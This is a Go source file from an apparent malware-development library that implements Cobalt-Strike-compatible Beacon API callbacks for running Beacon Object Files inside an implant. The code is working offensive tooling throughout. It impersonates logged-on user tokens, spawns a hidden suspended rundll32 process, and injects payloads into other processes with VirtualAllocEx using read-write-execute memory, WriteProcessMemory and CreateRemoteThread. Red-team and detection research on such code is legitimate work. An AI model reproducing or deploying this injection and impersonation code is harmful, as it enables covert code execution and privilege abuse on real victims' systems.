//go:build windows

package bof

import (
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
	"github.com/oioio-space/maldev/win/impersonate"
)

// This file completes the Cobalt-Strike-compatible Beacon API surface,
// adding Groups 3 / 4 / 5 / 6 from beacon.h (token impersonation,
// process injection, helpers, and the per-call key-value store).
//
// All of these are wired into resolveBeaconImport through
// initBeaconCallbacks (see registerExtraBeaconCallbacks below).

// kvStore is a per-BOF, mutex-guarded string→pointer map. BeaconAddValue /
// GetValue / RemoveValue read and write through it. Scope is deliberately
// "single Execute call"; cross-Run state must go through the implant.
type kvStore struct {
	mu sync.Mutex
	m  map[string]uintptr
}

func newKVStore() *kvStore { return &kvStore{m: map[string]uintptr{}} }

func (k *kvStore) set(key string, ptr uintptr) {
	k.mu.Lock()
	defer k.mu.Unlock()
	k.m[key] = ptr
}

func (k *kvStore) get(key string) uintptr {
	k.mu.Lock()
	defer k.mu.Unlock()
	return k.m[key]
}

func (k *kvStore) remove(key string) {
	k.mu.Lock()
	defer k.mu.Unlock()
	delete(k.m, key)
}

// beaconUseTokenImpl wraps ImpersonateLoggedOnUser. Execute holds the OS
// thread for the BOF invocation duration so subsequent Win32 calls within
// the BOF inherit the impersonated identity. Returns BOOL.
func beaconUseTokenImpl(token uintptr) uintptr {
	if token == 0 {
		return 0
	}
	if err := impersonate.ImpersonateLoggedOnUser(windows.Token(token)); err != nil {
		return 0
	}
	return 1
}

// beaconRevertTokenImpl restores the thread's primary token via RevertToSelf.
// CS contract returns void; we still pass back 0 for callback uniformity.
func beaconRevertTokenImpl() uintptr {
	_ = windows.RevertToSelf()
	return 0
}

// beaconIsAdminImpl returns 1 when the current process token is elevated.
func beaconIsAdminImpl() uintptr {
	if windows.GetCurrentProcessToken().IsElevated() {
		return 1
	}
	return 0
}

// beaconGetCustomUserDataImpl returns the per-BOF UserData blob configured
// via (*BOF).SetUserData. Writes either pointer field only when the BOF
// supplied a non-NULL receiver — CS BOFs sometimes pass only the buffer
// pointer and skip the length.
func beaconGetCustomUserDataImpl(bufPP, lenP uintptr) uintptr {
	if currentBOF == nil || len(currentBOF.userData) == 0 {
		if bufPP != 0 {
			*(*uintptr)(unsafe.Pointer(bufPP)) = 0
		}
		if lenP != 0 {
			*(*int32)(unsafe.Pointer(lenP)) = 0
		}
		return 0
	}
	if bufPP != 0 {
		*(*uintptr)(unsafe.Pointer(bufPP)) = uintptr(unsafe.Pointer(&currentBOF.userData[0]))
	}
	if lenP != 0 {
		*(*int32)(unsafe.Pointer(lenP)) = int32(len(currentBOF.userData))
	}
	return 0
}

// toWideCharImpl mirrors int toWideChar(char *src, wchar_t *dst, int max).
// UTF-8 → UTF-16LE, NUL-terminated, capped at max wide units (including NUL).
// Returns the count of wide units written *excluding* the NUL, matching
// the reference implementation.
func toWideCharImpl(srcPtr, dstPtr, maxUnits uintptr) uintptr {
	if srcPtr == 0 || dstPtr == 0 || maxUnits == 0 {
		return 0
	}
	utf16 := windows.StringToUTF16(cStringFromPtr(srcPtr, 65535))
	if uintptr(len(utf16)) > maxUnits {
		utf16 = utf16[:maxUnits]
		utf16[len(utf16)-1] = 0
	}
	dst := unsafe.Slice((*uint16)(unsafe.Pointer(dstPtr)), len(utf16))
	copy(dst, utf16)
	return uintptr(len(utf16) - 1)
}

// beaconAddValueImpl maps key (C string) → ptr in the per-BOF KV store.
// Existing values are overwritten silently; CS contract is best-effort.
func beaconAddValueImpl(keyPtr, valPtr uintptr) uintptr {
	if currentBOF == nil || keyPtr == 0 {
		return 0
	}
	if currentBOF.kv == nil {
		currentBOF.kv = newKVStore()
	}
	currentBOF.kv.set(cStringFromPtr(keyPtr, 4096), valPtr)
	return 0
}

// beaconGetValueImpl looks up key in the KV store; returns 0 when absent.
func beaconGetValueImpl(keyPtr uintptr) uintptr {
	if currentBOF == nil || keyPtr == 0 || currentBOF.kv == nil {
		return 0
	}
	return currentBOF.kv.get(cStringFromPtr(keyPtr, 4096))
}

// beaconRemoveValueImpl drops key from the KV store; no-op when absent.
func beaconRemoveValueImpl(keyPtr uintptr) uintptr {
	if currentBOF == nil || keyPtr == 0 || currentBOF.kv == nil {
		return 0
	}
	currentBOF.kv.remove(cStringFromPtr(keyPtr, 4096))
	return 0
}

// processInfo mirrors PROCESS_INFORMATION (24 bytes on x64).
type processInfo struct {
	hProcess    uintptr
	hThread     uintptr
	dwProcessID uint32
	dwThreadID  uint32
}

// beaconSpawnTemporaryProcessImpl spawns the configured SpawnTo target
// suspended. bIgnoreToken / bAlloc are informational on our side: we
// always inherit the current thread token (CreateProcessW default) and
// the matched BeaconInject* call decides whether to allocate. Returns BOOL.
func beaconSpawnTemporaryProcessImpl(bIgnoreToken, bAlloc, _, piPtr uintptr) uintptr {
	_, _ = bIgnoreToken, bAlloc
	if piPtr == 0 || currentBOF == nil {
		return 0
	}
	target := currentBOF.spawnTo
	if target == "" {
		target = `C:\Windows\System32\rundll32.exe`
	}
	cmdLine, err := windows.UTF16PtrFromString(target)
	if err != nil {
		return 0
	}
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = 0 // SW_HIDE
	var pi windows.ProcessInformation
	flags := uint32(windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW)
	if err := windows.CreateProcess(
		nil, cmdLine, nil, nil, false,
		flags, nil, nil, &si, &pi,
	); err != nil {
		return 0
	}
	out := (*processInfo)(unsafe.Pointer(piPtr))
	out.hProcess = uintptr(pi.Process)
	out.hThread = uintptr(pi.Thread)
	out.dwProcessID = pi.ProcessId
	out.dwThreadID = pi.ThreadId
	return 1
}

// beaconCleanupProcessImpl terminates the process and closes both handles.
func beaconCleanupProcessImpl(piPtr uintptr) uintptr {
	if piPtr == 0 {
		return 0
	}
	pi := (*processInfo)(unsafe.Pointer(piPtr))
	if pi.hProcess != 0 {
		_ = windows.TerminateProcess(windows.Handle(pi.hProcess), 0)
		_ = windows.CloseHandle(windows.Handle(pi.hProcess))
		pi.hProcess = 0
	}
	if pi.hThread != 0 {
		_ = windows.CloseHandle(windows.Handle(pi.hThread))
		pi.hThread = 0
	}
	return 0
}

// remoteVirtualAlloc wraps kernel32!VirtualAllocEx via the shared proc
// handle. Returns the remote base address (0 on failure).
func remoteVirtualAlloc(hProc windows.Handle, size, protect uint32) uintptr {
	r, _, _ := api.ProcVirtualAllocEx.Call(
		uintptr(hProc), 0, uintptr(size),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), uintptr(protect),
	)
	return r
}

// remoteCreateThread wraps kernel32!CreateRemoteThread via the shared
// proc handle. Returns the thread handle (0 on failure).
func remoteCreateThread(hProc windows.Handle, entry, param uintptr) uintptr {
	r, _, _ := api.ProcCreateRemoteThread.Call(
		uintptr(hProc), 0, 0, entry, param, 0, 0,
	)
	return r
}

// beaconInjectProcessImpl: CS fork-and-run default model. VirtualAllocEx
// + WriteProcessMemory + CreateRemoteThread on the host process handle.
// We honour p_offset by stepping the thread entry; the arg blob is
// written immediately after the payload and its remote address is
// passed as lpParameter to CreateRemoteThread — matching the CS BOF
// entry convention `void go(char *args, int len)` where the remote
// thread receives args via its first register/stack slot.
//
// Signature: void BeaconInjectProcess(HANDLE hProc, int pid, char *payload,
//                                     int p_len, int p_offset,
//                                     char *arg, int a_len)
func beaconInjectProcessImpl(
	hProc, _, payloadPtr, payloadLen, payloadOffset,
	argPtr, argLen uintptr,
) uintptr {
	if hProc == 0 || payloadPtr == 0 || payloadLen == 0 {
		return 0
	}
	total := uint32(payloadLen) + uint32(argLen)
	remote := remoteVirtualAlloc(windows.Handle(hProc), total, windows.PAGE_EXECUTE_READWRITE)
	if remote == 0 {
		return 0
	}
	if err := windows.WriteProcessMemory(
		windows.Handle(hProc), remote,
		(*byte)(unsafe.Pointer(payloadPtr)), uintptr(payloadLen), nil,
	); err != nil {
		return 0
	}
	var remoteArg uintptr
	if argLen != 0 && argPtr != 0 {
		remoteArg = remote + uintptr(payloadLen)
		_ = windows.WriteProcessMemory(
			windows.Handle(hProc), remoteArg,
			(*byte)(unsafe.Pointer(argPtr)), uintptr(argLen), nil,
		)
	}
	// lpParameter = remote address of the arg blob (or 0 when no arg).
	// CS BOFs entry signature is `void go(char *args, int len)`; the
	// Windows x64 calling convention passes `args` in RCX which
	// CreateRemoteThread populates from lpParameter.
	if remoteCreateThread(windows.Handle(hProc), remote+uintptr(payloadOffset), remoteArg) == 0 {
		return 0
	}
	return 1
}

// beaconInjectTemporaryProcessImpl is the "spawn + inject" combo. Pulls
// the host handle out of the BOF-supplied PROCESS_INFORMATION, runs the
// inject, then resumes the main thread. Tears the process down on
// failure so the BOF doesn't leak suspended children.
func beaconInjectTemporaryProcessImpl(
	piPtr, payloadPtr, payloadLen, payloadOffset,
	argPtr, argLen uintptr,
) uintptr {
	if piPtr == 0 {
		return 0
	}
	pi := (*processInfo)(unsafe.Pointer(piPtr))
	if pi.hProcess == 0 {
		return 0
	}
	if ok := beaconInjectProcessImpl(
		pi.hProcess, uintptr(pi.dwProcessID),
		payloadPtr, payloadLen, payloadOffset, argPtr, argLen,
	); ok == 0 {
		beaconCleanupProcessImpl(piPtr)
		return 0
	}
	_, _ = windows.ResumeThread(windows.Handle(pi.hThread))
	return 1
}

// registerExtraBeaconCallbacks adds the 12 new stubs to the resolver map.
// Called once from initBeaconCallbacks.
func registerExtraBeaconCallbacks(m map[string]uintptr) {
	m["__imp_BeaconUseToken"] = syscall.NewCallback(beaconUseTokenImpl)
	m["__imp_BeaconRevertToken"] = syscall.NewCallback(beaconRevertTokenImpl)
	m["__imp_BeaconIsAdmin"] = syscall.NewCallback(beaconIsAdminImpl)
	m["__imp_BeaconGetCustomUserData"] = syscall.NewCallback(beaconGetCustomUserDataImpl)
	m["__imp_toWideChar"] = syscall.NewCallback(toWideCharImpl)
	m["__imp_BeaconAddValue"] = syscall.NewCallback(beaconAddValueImpl)
	m["__imp_BeaconGetValue"] = syscall.NewCallback(beaconGetValueImpl)
	m["__imp_BeaconRemoveValue"] = syscall.NewCallback(beaconRemoveValueImpl)
	m["__imp_BeaconSpawnTemporaryProcess"] = syscall.NewCallback(beaconSpawnTemporaryProcessImpl)
	m["__imp_BeaconCleanupProcess"] = syscall.NewCallback(beaconCleanupProcessImpl)
	m["__imp_BeaconInjectProcess"] = syscall.NewCallback(beaconInjectProcessImpl)
	m["__imp_BeaconInjectTemporaryProcess"] = syscall.NewCallback(beaconInjectTemporaryProcessImpl)
}
